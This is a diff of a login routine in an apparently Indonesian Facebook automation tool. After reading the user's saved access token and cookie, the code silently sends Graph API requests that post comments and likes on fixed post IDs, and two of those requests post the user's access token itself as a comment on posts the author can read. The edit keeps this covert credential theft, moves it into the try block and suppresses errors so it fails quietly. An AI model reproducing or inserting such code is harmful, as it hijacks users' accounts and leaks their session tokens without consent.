@@ -259,27 +259,23 @@ def ___fii___Sayang___Kamu___Widiya___l():
     try:
         token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
-    except IOError:
-        print(f"{B} | ")
-        print(f"{B} | ")
-        print(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
-    kom = komenredem
-    komentar = komtwol
-    pipp = kartu2d
-    post = '3144112082575661'
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3330390423859469/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
-    requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
-    jalan(f'{P}[•] Login Berhasil')
-    menu()
-	
+        kom = komenredem
+        komentar = komtwol
+        pipp = kartu2d
+        post = '3144112082575661'
+        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3330390423859469/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
+        requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
+        print(f'{P}[•] Login Berhasil')
+        menu()
+    except Exception as e:pass
 ###### BUAT MENU
 def menu():
     global token,cookie
